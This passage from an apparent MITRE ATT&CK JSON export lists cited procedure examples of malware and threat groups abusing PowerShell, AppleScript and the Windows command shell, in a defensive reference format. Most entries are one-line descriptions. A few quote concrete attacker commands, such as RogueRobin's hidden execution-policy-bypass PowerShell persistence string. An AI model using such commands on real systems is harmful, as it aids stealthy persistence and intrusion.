                        "Description": "<name> has the ability to use PowerShell scripts to execute commands.[172]"
                    },
                    "S0184": {
                        "ID": "S0184",
                        "Name": "POWRUNER",
                        "Description": "<name> is written in PowerShell.[43]"
                    },
                    "S1058": {
                        "ID": "S1058",
                        "Name": "Prestige",
                        "Description": "<name> can use PowerShell for payload execution on targeted systems.[200]"
                    },
                    "S0613": {
                        "ID": "S0613",
                        "Name": "PS1",
                        "Description": "<name> can utilize a PowerShell loader.[201]"
                    },
                    "S0196": {
                        "ID": "S0196",
                        "Name": "PUNCHBUGGY",
                        "Description": "<name> has used PowerShell scripts.[202]"
                    },
                    "S0192": {
                        "ID": "S0192",
                        "Name": "Pupy",
                        "Description": "<name> has a module for loading and executing PowerShell scripts.[203]"
                    },
                    "S1032": {
                        "ID": "S1032",
                        "Name": "PyDCrypt",
                        "Description": "<name> has attempted to execute with PowerShell.[204]"
                    },
                    "S0583": {
                        "ID": "S0583",
                        "Name": "Pysa",
                        "Description": "<name> has used Powershell scripts to deploy its ransomware.[205]"
                    },
                    "S0650": {
                        "ID": "S0650",
                        "Name": "QakBot",
                        "Description": "<name> can use PowerShell to download and execute payloads.[206]"
                    },
                    "S0269": {
                        "ID": "S0269",
                        "Name": "QUADAGENT",
                        "Description": "<name> uses PowerShell scripts for execution.[207]"
                    },
                    "S0241": {
                        "ID": "S0241",
                        "Name": "RATANKBA",
                        "Description": "There is a variant of <name> that uses a PowerShell script instead of the traditional PE form.[208][209]"
                    },
                    "S0511": {
                        "ID": "S0511",
                        "Name": "RegDuke",
                        "Description": "<name> can extract and execute PowerShell scripts from C2 communications.[96]"
                    },
                    "S0379": {
                        "ID": "S0379",
                        "Name": "Revenge RAT",
                        "Description": "<name> uses the PowerShell command Reflection.Assembly to load itself into memory to aid in execution.[210]"
                    },
                    "S0496": {
                        "ID": "S0496",
                        "Name": "REvil",
                        "Description": "<name> has used PowerShell to delete volume shadow copies and download files.[211][212][213][214]"
                    },
                    "S0270": {
                        "ID": "S0270",
                        "Name": "RogueRobin",
                        "Description": "<name> uses a command prompt to run a PowerShell script from Excel.[77] To assist in establishing persistence, <name> creates %APPDATA%\\OneDrive.bat and saves the following string to it:powershell.exe -WindowStyle Hidden -exec bypass -File \"%APPDATA%\\OneDrive.ps1\".[215][77]"
                    },
                    "S1018": {
                        "ID": "S1018",
                        "Name": "Saint Bot",
                        "Description": "<name> has used PowerShell for execution.[88]"
                    },
                    "G0034": {
                        "ID": "G0034",
                        "Name": "Sandworm Team",
                        "Description": "<name> has used PowerShell scripts to run a credential harvesting tool in memory to evade defenses.[216][6]"
                    },
                    "S1085": {
                        "ID": "S1085",
                        "Name": "Sardonic",
                        "Description": "<name> has the ability to execute PowerShell commands on a compromised machine.[217]"
                    },
                    "S0053": {
                        "ID": "S0053",
                        "Name": "SeaDuke",
                        "Description": "<name> uses a module to execute Mimikatz with PowerShell to perform Pass the Ticket.[15]"
                    },
                    "S0382": {
                        "ID": "S0382",
                        "Name": "ServHelper",
                        "Description": "<name> has the ability to execute a PowerShell script to get information from the infected host.[218]"
                    },
                    "S0546": {
                        "ID": "S0546",
                        "Name": "SharpStage",
                        "Description": "<name> can execute arbitrary commands with PowerShell.[160][219]"
                    },
                    "S0450": {
                        "ID": "S0450",
                        "Name": "SHARPSTATS",
                        "Description": "<name> has the ability to employ a custom PowerShell script.[198]"
                    },
                    "G0121": {
                        "ID": "G0121",
                        "Name": "Sidewinder",
                        "Description": "<name> has used PowerShell to drop and execute malware loaders.[220]"
                    },
                    "G0091": {
                        "ID": "G0091",
                        "Name": "Silence",
                        "Description": "<name> has used PowerShell to download and execute payloads.[221][222]"
                    },
                    "S0692": {
                        "ID": "S0692",
                        "Name": "SILENTTRINITY",
                        "Description": "<name> can use PowerShell to execute commands.[223]"
                    },
                    "S0649": {
                        "ID": "S0649",
                        "Name": "SMOKEDHAM",
                        "Description": "<name> can execute Powershell commands sent from its C2 server.[224]"
                    },
                    "S1086": {
                        "ID": "S1086",
                        "Name": "Snip3",
                        "Description": "<name> can use a PowerShell script for second-stage execution.[225][226]"
                    },
                    "S0273": {
                        "ID": "S0273",
                        "Name": "Socksbot",
                        "Description": "<name> can write and execute PowerShell scripts.[187]"
                    },
                    "C0024": {
                        "ID": "C0024",
                        "Name": "SolarWinds Compromise",
                        "Description": "During the <name>, APT29 used PowerShell to create new tasks on remote machines, identify configuration settings, exfiltrate data, and execute other commands.[227][228][229]"
                    },
                    "S0390": {
                        "ID": "S0390",
                        "Name": "SQLRat",
                        "Description": "<name> has used PowerShell to create a Meterpreter session.[230]"
                    },
                    "S1030": {
                        "ID": "S1030",
                        "Name": "Squirrelwaffle",
                        "Description": "<name> has used PowerShell to execute its payload.[231][232]"
                    },
                    "G0038": {
                        "ID": "G0038",
                        "Name": "Stealth Falcon",
                        "Description": "<name> malware uses PowerShell commands to perform various functions, including gathering system information via WMI and executing commands from its C2 server.[233]"
                    },
                    "S0491": {
                        "ID": "S0491",
                        "Name": "StrongPity",
                        "Description": "<name> can use PowerShell to add files to the Windows Defender exclusions list.[234]"
                    },
                    "G1018": {
                        "ID": "G1018",
                        "Name": "TA2541",
                        "Description": "<name> has used PowerShell to download files and to inject into various Windows processes.[235]"
                    },
                    "G0062": {
                        "ID": "G0062",
                        "Name": "TA459",
                        "Description": "<name> has used PowerShell for execution of a payload.[236]"
                    },
                    "G0092": {
                        "ID": "G0092",
                        "Name": "TA505",
                        "Description": "<name> has used PowerShell to download and execute malware and reconnaissance scripts.[237][238][239][240]"
                    },
                    "G0139": {
                        "ID": "G0139",
                        "Name": "TeamTNT",
                        "Description": "<name> has executed PowerShell commands in batch scripts.[241]"
                    },
                    "G0027": {
                        "ID": "G0027",
                        "Name": "Threat Group-3390",
                        "Description": "<name> has used PowerShell for execution.[242][56]"
                    },
                    "G0076": {
                        "ID": "G0076",
                        "Name": "Thrip",
                        "Description": "<name> leveraged PowerShell to run commands to download payloads, traverse the compromised networks, and carry out reconnaissance.[243]"
                    },
                    "G1022": {
                        "ID": "G1022",
                        "Name": "ToddyCat",
                        "Description": "<name> has used Powershell scripts to perform post exploit collection.[244]"
                    },
                    "G0131": {
                        "ID": "G0131",
                        "Name": "Tonto Team",
                        "Description": "<name> has used PowerShell to download additional payloads.[245]"
                    },
                    "S0266": {
                        "ID": "S0266",
                        "Name": "TrickBot",
                        "Description": "<name> has been known to use PowerShell to download new payloads, open documents, and upload data to command and control servers.  [246]"
                    },
                    "C0030": {
                        "ID": "C0030",
                        "Name": "Triton Safety Instrumented System Attack",
                        "Description": "In the <name>, TEMP.Veles used a publicly available PowerShell-based tool, WMImplant.[247]"
                    },
                    "G0010": {
                        "ID": "G0010",
                        "Name": "Turla",
                        "Description": "<name> has used PowerShell to execute commands/scripts, in some cases via a custom executable or code from Empire's PSInject.[248][196][249] <name> has also used PowerShell scripts to load and execute malware in memory."
                    },
                    "S0386": {
                        "ID": "S0386",
                        "Name": "Ursnif",
                        "Description": "<name> droppers have used PowerShell in download cradles to download and execute the malware's full executable payload.[250]"
                    },
                    "S0476": {
                        "ID": "S0476",
                        "Name": "Valak",
                        "Description": "<name> has used PowerShell to download additional modules.[251]"
                    },
                    "G1017": {
                        "ID": "G1017",
                        "Name": "Volt Typhoon",
                        "Description": "<name> has used PowerShell including for remote system discovery.[252][253]"
                    },
                    "S0670": {
                        "ID": "S0670",
                        "Name": "WarzoneRAT",
                        "Description": "<name> can use PowerShell to download files and execute commands.[254][255]"
                    },
                    "S0514": {
                        "ID": "S0514",
                        "Name": "WellMess",
                        "Description": "<name> can execute PowerShell scripts received from C2.[256][257]"
                    },
                    "S0689": {
                        "ID": "S0689",
                        "Name": "WhisperGate",
                        "Description": "<name> can use PowerShell to support multiple actions including execution and defense evasion.[258][259][260]"
                    },
                    "G0090": {
                        "ID": "G0090",
                        "Name": "WIRTE",
                        "Description": "<name> has used PowerShell for script execution.[261]"
                    },
                    "G0102": {
                        "ID": "G0102",
                        "Name": "Wizard Spider",
                        "Description": "<name> has used macros to execute PowerShell scripts to download malware on victim's machines.[262] It has also used PowerShell to execute commands and move laterally through a victim network.[263][264][265][266]"
                    },
                    "S1065": {
                        "ID": "S1065",
                        "Name": "Woody RAT",
                        "Description": "<name> can execute PowerShell commands and scripts with the use of .NET DLL, WoodyPowerSession.[267]"
                    },
                    "S0341": {
                        "ID": "S0341",
                        "Name": "Xbash",
                        "Description": "<name> can use scripts to invoke PowerShell to download a malicious PE executable or PE DLL for execution.[268]"
                    },
                    "S0330": {
                        "ID": "S0330",
                        "Name": "Zeus Panda",
                        "Description": "<name> uses PowerShell to download and execute the payload.[269]"
                    }
                }
            },
            "002": {
                "name": "AppleScript",
                "href": "/techniques/T1059/002",
                "description": "Adversaries may abuse AppleScript for execution. AppleScript is a macOS scripting language designed to control applications and parts of the OS via inter-application messages called AppleEvents.[1] These AppleEvent messages can be sent independently or easily scripted with AppleScript. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely.Scripts can be run from the command-line via osascript /path/to/script or osascript -e \"script here\". Aside from the command line, scripts can be executed in numerous ways including Mail rules, Calendar.app alarms, and Automator workflows. AppleScripts can also be executed as plain text shell scripts by adding #!/usr/bin/osascript to the start of the script file.[2]AppleScripts do not need to call osascript to execute. However, they may be executed from within mach-O binaries by using the macOS Native APIs\u00a0NSAppleScript\u00a0or\u00a0OSAScript, both of which execute code independent of the /usr/bin/osascript command line utility.Adversaries may abuse AppleScript to execute various behaviors, such as interacting with an open SSH connection, moving to remote machines, and even presenting users with fake dialog boxes. These events cannot start applications remotely (they can start them locally), but they can interact with applications if they're already running remotely. On macOS 10.10 Yosemite and higher, AppleScript has the ability to execute Native APIs, which otherwise would require compilation and execution in a mach-O binary file format.[3] Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via Python.[4]",
                "Procedure": {
                    "S0482": {
                        "ID": "S0482",
                        "Name": "Bundlore",
                        "Description": "<name> can use AppleScript to inject malicious JavaScript into a browser.[5]"
                    },
                    "S0281": {
                        "ID": "S0281",
                        "Name": "Dok",
                        "Description": "<name> uses AppleScript to create a login item for persistence.[6]"
                    },
                    "S1048": {
                        "ID": "S1048",
                        "Name": "macOS.OSAMiner",
                        "Description": "<name> has used osascript to call itself via the do shell script command in the Launch Agent .plist file.[7]"
                    },
                    "S0595": {
                        "ID": "S0595",
                        "Name": "ThiefQuest",
                        "Description": "<name> uses AppleScript's osascript -e command to launch <name>'s persistence via Launch Agent and Launch Daemon. [8]"
                    }
                }
            },
            "003": {
                "name": "Windows Command Shell",
                "href": "/techniques/T1059/003",
                "description": "Adversaries may abuse the Windows command shell for execution. The Windows command shell (cmd) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. The command prompt can be invoked remotely via Remote Services such as SSH.[1]Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple systems.Adversaries may leverage cmd to execute various commands and payloads. Common uses include cmd to execute a single command, or abusing cmd interactively with input and output forwarded over a command and control channel.",
                "Procedure": {
                    "C0025": {
                        "ID": "C0025",
                        "Name": "2016 Ukraine Electric Power Attack",
                        "Description": "During the <name>, Sandworm Team used the xp_cmdshell command in MS-SQL.[2]"
                    },
                    "S0065": {
                        "ID": "S0065",
                        "Name": "4H RAT",
                        "Description": "<name> has the capability to create a remote shell.[3]"
                    },
                    "S0469": {
                        "ID": "S0469",
                        "Name": "ABK",
                        "Description": "<name> has the ability to use cmd to run a Portable Executable (PE) on the compromised host.[4]"
                    },
                    "S1028": {
                        "ID": "S1028",
                        "Name": "Action RAT",
                        "Description": "<name> can use cmd.exe to execute commands on an infected host.[5]"
                    },
                    "S0202": {
                        "ID": "S0202",
                        "Name": "adbupd",
                        "Description": "<name> can run a copy of cmd.exe.[6]"
                    },
                    "G0018": {
                        "ID": "G0018",
                        "Name": "admin@338",
                        "Description": "Following exploitation with LOWBALL malware, <name> actors created a file containing a list of commands to be executed on the compromised computer.[7]"
                    },
                    "S0045": {
                        "ID": "S0045",
                        "Name": "ADVSTORESHELL",
                        "Description": "<name> can create a remote shell and run a given command.[8][9]"
                    },
                    "S1129": {
                        "ID": "S1129",
                        "Name": "Akira",
                        "Description": "<name> executes from the Windows command line and can take various arguments for execution.[10]"
                    },
                    "S0504": {
                        "ID": "S0504",
                        "Name": "Anchor",
                        "Description": "<name> has used cmd.exe to run its self deletion routine.[11]"
                    },
                    "G0006": {
                        "ID": "G0006",
                        "Name": "APT1",
                        "Description": "<name> has used the Windows command shell to execute commands, and batch scripting to automate execution.[12]"
                    },
                    "G0026": {
                        "ID": "G0026",
                        "Name": "APT18",
                        "Description": "<name> uses cmd.exe to execute commands on the victim\u2019s machine.[13][14]"
                    },
                    "G0007": {
                        "ID": "G0007",
                        "Name": "APT28",
                        "Description": "An <name> loader Trojan uses a cmd.exe and batch script to run its payload.[15] The group has also used macros to execute payloads.[16][17][18][19]"
                    },
                    "G0022": {
                        "ID": "G0022",
                        "Name": "APT3",
                        "Description": "An <name> downloader uses the Windows command \"cmd.exe\" /C whoami. The group also uses a tool to execute commands on remote computers.[20][21]"
                    },
                    "G0050": {
                        "ID": "G0050",
                        "Name": "APT32",
                        "Description": "<name> has used cmd.exe for execution.[22]"
                    },
                    "G0067": {
                        "ID": "G0067",
                        "Name": "APT37",
                        "Description": "<name> has used the command-line interface.[23][24]"
                    },
                    "G0082": {
                        "ID": "G0082",
                        "Name": "APT38",
                        "Description": "<name> has used a command-line tunneler, NACHOCHEESE, to give them shell access to a victim\u2019s machine.[25]"
                    },
                    "G0096": {
                        "ID": "G0096",
                        "Name": "APT41",
                        "Description": "<name> used cmd.exe /c to execute commands on remote machines.[26]<name> used a batch file to install persistence for the Cobalt Strike BEACON loader.[27]"
                    },
                    "G1023": {
                        "ID": "G1023",
                        "Name": "APT5",
                        "Description": "<name> has used cmd.exe for execution on compromised systems.[28]"
                    },
                    "G0143": {
                        "ID": "G0143",
                        "Name": "Aquatic Panda",
                        "Description": "<name> has attempted and failed to run Bash commands on a Windows host by passing them to cmd /C.[29]"
                    },
                    "S0373": {
                        "ID": "S0373",
                        "Name": "Astaroth",
                        "Description": "<name> spawns a CMD process to execute commands. [30]"
                    },
                    "S0347": {
                        "ID": "S0347",
                        "Name": "AuditCred",
                        "Description": "<name> can open a reverse shell on the system to execute commands.[31]"
                    },
                    "S1029": {
                        "ID": "S1029",
                        "Name": "AuTo Stealer",
                        "Description": "<name> can use cmd.exe to execute a created batch file.[5]"
                    },
                    "S0638": {
                        "ID": "S0638",
                        "Name": "Babuk",
                        "Description": "<name> has the ability to use the command line to control execution on compromised hosts.[32][33]"
                    },
                    "S0414": {
                        "ID": "S0414",
                        "Name": "BabyShark",
                        "Description": "<name> has used cmd.exe to execute commands.[34]"
                    },
                    "S0475": {
                        "ID": "S0475",
                        "Name": "BackConfig",
                        "Description": "<name> can download and run batch files to execute commands on a compromised host.[35]"
                    },
                    "S0031": {
                        "ID": "S0031",
                        "Name": "BACKSPACE",
                        "Description": "Adversaries can direct <name> to execute from the command line on infected hosts, or have <name> create a reverse shell.[36]"
                    },
                    "S1081": {
                        "ID": "S1081",
                        "Name": "BADHATCH",
                        "Description": "<name> can use cmd.exe to execute commands on a compromised host.[37][38]"
                    },
                    "S0128": {
                        "ID": "S0128",
                        "Name": "BADNEWS",
                        "Description": "<name> is capable of executing commands via cmd.exe.[39][40]"
                    },
                    "S0234": {
                        "ID": "S0234",
                        "Name": "Bandook",
                        "Description": "<name> is capable of spawning a Windows command shell.[41][42]"
                    },
                    "S0239": {
                        "ID": "S0239",
                        "Name": "Bankshot",
                        "Description": "<name> uses the command-line interface to execute arbitrary commands.[43][44]"
                    },
                    "S0534": {
                        "ID": "S0534",
                        "Name": "Bazar",
                        "Description": "<name> can launch cmd.exe to perform reconnaissance commands.[45][46]"
                    },
                    "S0470": {
                        "ID": "S0470",
                        "Name": "BBK",
                        "Description": "<name> has the ability to use cmd to run a Portable Executable (PE) on the compromised host.[4]"
                    },
                    "S0017": {
                        "ID": "S0017",
                        "Name": "BISCUIT",
                        "Description": "<name> has a command to launch a command shell on the system.[47]"
                    },
                    "S0268": {
                        "ID": "S0268",
                        "Name": "Bisonal",
                        "Description": "<name> has launched cmd.exe and used the ShellExecuteW() API function to execute commands on the system.[48][49][50]"
                    },
                    "S1070": {
                        "ID": "S1070",
                        "Name": "Black Basta",
                        "Description": "<name> can use cmd.exe to enable shadow copy deletion.[51]"
                    },
                    "S1068": {
                        "ID": "S1068",
                        "Name": "BlackCat",
                        "Description": "<name> can execute commands on a compromised network with the use of cmd.exe.[52]"
                    },
                    "S0069": {
                        "ID": "S0069",
                        "Name": "BLACKCOFFEE",
                        "Description": "<name> has the capability to create a reverse shell.[53]"
                    },
                    "S0564": {
                        "ID": "S0564",
                        "Name": "BlackMould",
                        "Description": "<name> can run cmd.exe with parameters.[54]"
                    },
                    "S0520": {
                        "ID": "S0520",
                        "Name": "BLINDINGCAN",
                        "Description": "<name> has executed commands via cmd.exe.[55]"
                    },
                    "G0108": {
                        "ID": "G0108",
                        "Name": "Blue Mockingbird",
                        "Description": "<name> has used batch script files to automate execution and deployment of payloads.[56]"
                    },
                    "S0360": {
                        "ID": "S0360",
                        "Name": "BONDUPDATER",
                        "Description": "<name> can read batch commands in a file sent from its C2 server and execute them with cmd.exe.[57]"
                    },
                    "S0651": {
                        "ID": "S0651",
                        "Name": "BoxCaon",
                        "Description": "<name> can execute arbitrary commands and utilize the \"ComSpec\" environment variable.[58]"
                    },
                    "G0060": {
                        "ID": "G0060",
                        "Name": "BRONZE BUTLER",
                        "Description": "<name> has used batch scripts and the command-line interface for execution.[59]"
                    },
                    "S1063": {
                        "ID": "S1063",
                        "Name": "Brute Ratel C4",
                        "Description": "<name> can use cmd.exe for execution.[60]"
                    },
                    "S1039": {
                        "ID": "S1039",
                        "Name": "Bumblebee",
                        "Description": "<name> can use cmd.exe to drop and run files.[61][62]"
                    },
                    "C0015": {
                        "ID": "C0015",
                        "Name": "C0015",
                        "Description": "During <name>, the threat actors used cmd.exe to execute commands and run malicious binaries.[63]"
                    },
                    "C0017": {
                        "ID": "C0017",
                        "Name": "C0017",
                        "Description": "During <name>, APT41 used cmd.exe to execute reconnaissance commands.[64]"
                    },
                    "S0025": {
                        "ID": "S0025",
                        "Name": "CALENDAR",
                        "Description": "<name> has a command to run cmd.exe to execute commands.[47]"
                    },
                    "S0030": {
                        "ID": "S0030",
                        "Name": "Carbanak",
                        "Description": "<name> has a command to create a reverse shell.[65]"
                    },
                    "S0348": {
                        "ID": "S0348",
                        "Name": "Cardinal RAT",
                        "Description": "<name> can execute commands.[66]"
                    },
                    "S0462": {
                        "ID": "S0462",
                        "Name": "CARROTBAT",
                        "Description": "<name> has the ability to execute command line arguments on a compromised host.[67]"
                    },
                    "S0572": {
                        "ID": "S0572",
                        "Name": "Caterpillar WebShell",
                        "Description": "<name> can run commands on the compromised asset with CMD functions.[68]"
                    },
                    "S1043": {
                        "ID": "S1043",
                        "Name": "ccf32",
                        "Description": "<name> has used cmd.exe for archiving data and deleting files.[69]"
                    },
                    "S0631": {
                        "ID": "S0631",
                        "Name": "Chaes",
                        "Description": "<name> has used cmd to execute tasks on the system.[70]"
                    },
                    "S0674": {
                        "ID": "S0674",
                        "Name": "CharmPower",
                        "Description": "The C# implementation of  the <name> command execution module can use cmd.[71]"
                    },
                    "G0114": {
                        "ID": "G0114",
                        "Name": "Chimera",
                        "Description": "<name> has used the Windows Command Shell and batch scripts for execution on compromised hosts.[72]"
                    },
                    "S0020": {
                        "ID": "S0020",
                        "Name": "China Chopper",
                        "Description": "<name>'s server component is capable of opening a command terminal.[73][74][75]"
                    },
                    "G1021": {
                        "ID": "G1021",
                        "Name": "Cinnamon Tempest",
                        "Description": "<name> has executed ransomware using batch scripts deployed via GPO.[76]"
                    },
                    "S0660": {
                        "ID": "S0660",
                        "Name": "Clambling",
                        "Description": "<name> can use cmd.exe for command execution.[77]"
                    },
                    "S0611": {
                        "ID": "S0611",
                        "Name": "Clop",
                        "Description": "<name> can use cmd.exe to help execute commands on the system.[78]"
                    },
                    "S0106": {
                        "ID": "S0106",
                        "Name": "cmd",
                        "Description": "<name> is used to execute programs and other actions at the command-line interface.[79]"
                    },
                    "G0080": {
                        "ID": "G0080",
                        "Name": "Cobalt Group",
                        "Description": "<name> has used a JavaScript backdoor that is capable of launching cmd.exe to execute shell commands.[80] The group has used an exploit toolkit known as Threadkit that launches .bat files.[81][82][83][80][84][85]"
                    },
                    "S0154": {
                        "ID": "S0154",
                        "Name": "Cobalt Strike",
                        "Description": "<name> uses a command-line interface to interact with systems.[86][87][88][89]"
                    },
                    "S0338": {
                        "ID": "S0338",
                        "Name": "Cobian RAT",
                        "Description": "<name> can launch a remote command shell interface for executing commands.[90]"
                    },
                    "S0369": {
                        "ID": "S0369",
                        "Name": "CoinTicker",
                        "Description": "<name> executes a bash script to establish a reverse shell.[91]"
                    },
                    "S0244": {
                        "ID": "S0244",
                        "Name": "Comnie",
                        "Description": "<name> executes BAT scripts.[92]"
                    },
                    "S0126": {
                        "ID": "S0126",
                        "Name": "ComRAT",
                        "Description": "<name> has used cmd.exe to execute commands.[93]"
                    },
                    "S0575": {
                        "ID": "S0575",
                        "Name": "Conti",
                        "Description": "<name> can utilize command line options to allow an attacker control over how it scans and encrypts files.[94][63]"
                    },
                    "S0046": {
                        "ID": "S0046",
                        "Name": "CozyCar",
                        "Description": "A module in <name> allows arbitrary commands to be executed by invoking C:\\Windows\\System32\\cmd.exe.[95]"
                    },
                    "S0115": {
                        "ID": "S0115",
                        "Name": "Crimson",
                        "Description": "<name> has the ability to execute commands with the COMSPEC environment variable.[96]"
                    },
                    "S0625": {
                        "ID": "S0625",
                        "Name": "Cuba",
                        "Description": "<name> has used cmd.exe /c and batch files for execution.[97]"
                    },
                    "S1014": {
                        "ID": "S1014",
                        "Name": "DanBot",
                        "Description": "<name> has the ability to execute arbitrary commands via cmd.exe.[98][99]"
                    },
                    "G0070": {
                        "ID": "G0070",
                        "Name": "Dark Caracal",
                        "Description": "<name> has used macros in Word documents that would download a second stage if executed.[100]"
                    },
                    "S0334": {
                        "ID": "S0334",
                        "Name": "DarkComet",
                        "Description": "<name> can launch a remote shell to execute commands on the victim\u2019s machine.[101]"
                    },
                    "S1111": {
                        "ID": "S1111",
                        "Name": "DarkGate",
                        "Description": "<name> uses a malicious Windows Batch script to run the Windows code utility to retrieve follow-on script payloads.[102]"
                    },
                    "G0012": {
                        "ID": "G0012",
                        "Name": "Darkhotel",
                        "Description": "<name> has dropped an mspaint.lnk shortcut to disk which launches a shell script that downloads and executes a file.[103]"
                    },
                    "S1066": {
                        "ID": "S1066",
                        "Name": "DarkTortilla",
                        "Description": "<name> can use cmd.exe to add registry keys for persistence.[104]"
                    },
                    "S0673": {
                        "ID": "S0673",
                        "Name": "DarkWatchman",
                        "Description": "<name> can use cmd.exe to execute commands.[105]"
                    },
                    "S0187": {
                        "ID": "S0187",
                        "Name": "Daserf",
                        "Description": "<name> can execute shell commands.[106][59]"
                    },
                    "S1052": {
                        "ID": "S1052",
                        "Name": "DEADEYE",
                        "Description": "<name> can run cmd /c copy /y /b C:\\Users\\public\\syslog_6-*.dat C:\\Users\\public\\syslog.dll to combine separated sections of code into a single DLL prior to execution.[64]"
                    },
                    "S0243": {
                        "ID": "S0243",
                        "Name": "DealersChoice",
                        "Description": "<name> makes modifications to open-source scripts from GitHub and executes them on the victim\u2019s machine.[107]"
                    },
                    "S0354": {
                        "ID": "S0354",
                        "Name": "Denis",
                        "Description": "<name> can launch a remote shell to execute arbitrary commands on the victim\u2019s machine.[108][22]"
                    },
                    "S0200": {
                        "ID": "S0200",
                        "Name": "Dipsind",
                        "Description": "<name> can spawn remote shells.[6]"
                    },
                    "S1021": {
                        "ID": "S1021",
                        "Name": "DnsSystem",
                        "Description": "<name> can use cmd.exe for execution.[109]"
                    },
                    "S0186": {
                        "ID": "S0186",
                        "Name": "DownPaper",
                        "Description": "<name> uses the command line.[110]"
                    },
                    "G0035": {
                        "ID": "G0035",
                        "Name": "Dragonfly",
                        "Description": "<name> has used various types of scripting to perform operations, including batch scripts.[111]"
                    },
                    "S0547": {
                        "ID": "S0547",
                        "Name": "DropBook",
                        "Description": "<name> can execute arbitrary shell commands on the victims' machines.[112][113]"
                    },
                    "S0567": {
                        "ID": "S0567",
                        "Name": "Dtrack",
                        "Description": "<name> has used cmd.exe to add a persistent service.[114]"
                    },
                    "S0593": {
                        "ID": "S0593",
                        "Name": "ECCENTRICBANDWAGON",
                        "Description": "<name> can use cmd to execute commands on a victim\u2019s machine.[115]"
                    },
                    "S0554": {
                        "ID": "S0554",
                        "Name": "Egregor",
                        "Description": "<name> has used batch files for execution and can launch Internet Explorer from cmd.exe.[116][117]"
                    },
                    "G1003": {
                        "ID": "G1003",
                        "Name": "Ember Bear",
                        "Description": "<name> had used cmd.exe and Windows Script Host (wscript) to execute malicious code.[118]"
                    },
                    "S0082": {
                        "ID": "S0082",
                        "Name": "Emissary",
                        "Description": "<name> has the capability to create a remote shell and execute specified commands.[119]"
                    },
                    "S0367": {
                        "ID": "S0367",
                        "Name": "Emotet",
                        "Description": "<name> has used cmd.exe to run a PowerShell script. [120]"
                    },
                    "S0363": {
                        "ID": "S0363",
                        "Name": "Empire",
                        "Description": "<name> has modules for executing scripts.[121]"
                    },
                    "S0634": {
                        "ID": "S0634",
                        "Name": "EnvyScout",
                        "Description": "<name> can use cmd.exe to execute malicious files on compromised hosts.[122]"
                    },
                    "S0396": {
                        "ID": "S0396",
                        "Name": "EvilBunny",
                        "Description": "<name> has an integrated scripting engine to download and execute Lua scripts.[123]"
                    },
                    "S0343": {
                        "ID": "S0343",
                        "Name": "Exaramel for Windows",
                        "Description": "<name> has a command to launch a remote shell and executes commands on the victim\u2019s machine.[124]"
                    },
                    "S0171": {
                        "ID": "S0171",
                        "Name": "Felismus",
                        "Description": "<name> uses command line for execution.[125]"
                    },
                    "S0267": {
                        "ID": "S0267",
                        "Name": "FELIXROOT",
                        "Description": "<name> executes batch scripts on the victim\u2019s machine, and can launch a reverse shell for command execution.[126][127]"
                    },
                    "G0051": {
                        "ID": "G0051",
                        "Name": "FIN10",
                        "Description": "<name> has executed malicious .bat files containing PowerShell commands.[128]"
                    },
                    "G1016": {
                        "ID": "G1016",
                        "Name": "FIN13",
                        "Description": "<name> has leveraged xp_cmdshell and Windows Command Shell to execute commands on a compromised machine. <name> has also attempted to leverage the \u2018xp_cmdshell\u2019 SQL procedure to execute remote commands on internal MS-SQL servers.[129][130]"
                    },
                    "G0037": {
                        "ID": "G0037",
                        "Name": "FIN6",
                        "Description": "<name> has used kill.bat script to disable security tools.[131]"
                    },
                    "G0046": {
                        "ID": "G0046",
                        "Name": "FIN7",
                        "Description": "<name> used the command prompt to launch commands on the victim\u2019s machine.[132][133][134]"
                    },
                    "G0061": {
                        "ID": "G0061",
                        "Name": "FIN8",
                        "Description": "<name> has used a Batch file to automate frequently executed post compromise cleanup activities.[135] <name> has also executed commands remotely via cmd.exe.[136][137][138]"
                    },
                    "S0696": {
                        "ID": "S0696",
                        "Name": "Flagpro",
                        "Description": "<name> can use cmd.exe to execute commands received from C2.[139]"
                    },
                    "S0381": {
                        "ID": "S0381",
                        "Name": "FlawedAmmyy",
                        "Description": "<name> has used cmd to execute commands on a compromised host.[140]"
                    },
                    "G0117": {
                        "ID": "G0117",
                        "Name": "Fox Kitten",
                        "Description": "<name> has used cmd.exe likely as a password changing mechanism.[141]"
                    },
                    "C0001": {
                        "ID": "C0001",
                        "Name": "Frankenstein",
                        "Description": "During <name>, the threat actors ran a command script to set up persistence as a scheduled task named \"WinUpdate\", as well as other encoded commands from the command-line [142]"
                    },
                    "S1044": {
                        "ID": "S1044",
                        "Name": "FunnyDream",
                        "Description": "<name> can use cmd.exe for execution on remote hosts.[69]"
                    },
                    "C0007": {
                        "ID": "C0007",
                        "Name": "FunnyDream",
                        "Description": "During <name>, the threat actors used cmd.exe to execute the wmiexec.vbs script.[69]"
                    },
                    "G0093": {
                        "ID": "G0093",
                        "Name": "GALLIUM",
                        "Description": "<name> used the Windows command shell to execute commands.[143]"
                    },
                    "G0047": {
                        "ID": "G0047",
                        "Name": "Gamaredon Group",
                        "Description": "<name> has used various batch scripts to establish C2 and download additional files. <name>'s backdoor malware has also been written to a batch file.[144][145][146][147]"
                    },
                    "S0666": {
                        "ID": "S0666",
                        "Name": "Gelsemium",
                        "Description": "<name> can use a batch script to delete itself.[148]"
                    },
                    "S0249": {
                        "ID": "S0249",
                        "Name": "Gold Dragon",
                        "Description": "<name> uses cmd.exe to execute commands for discovery.[149]"
                    },
                    "S0493": {
                        "ID": "S0493",
                        "Name": "GoldenSpy",
                        "Description": "<name> can execute remote commands via the command-line interface.[150]"
                    },
                    "S0588": {
                        "ID": "S0588",
                        "Name": "GoldMax",
                        "Description": "<name> can spawn a command shell, and execute native commands.[151][152]"
                    },
                    "S0477": {
                        "ID": "S0477",
                        "Name": "Goopy",
                        "Description": "<name> has the ability to use cmd.exe to execute commands passed from an Outlook C2 channel.[22]"
                    },
                    "G0078": {
                        "ID": "G0078",
                        "Name": "Gorgon Group",
                        "Description": "<name> malware can use cmd.exe to download and execute payloads and to execute commands on the system.[153]"
                    },
                    "S0237": {
                        "ID": "S0237",
                        "Name": "GravityRAT",
                        "Description": "<name> executes commands remotely on the infected host.[154]"
                    },
                    "S0342": {
                        "ID": "S0342",
                        "Name": "GreyEnergy",
                        "Description": "<name> uses cmd.exe to execute itself in-memory.[127]"
                    },
                    "S0632": {
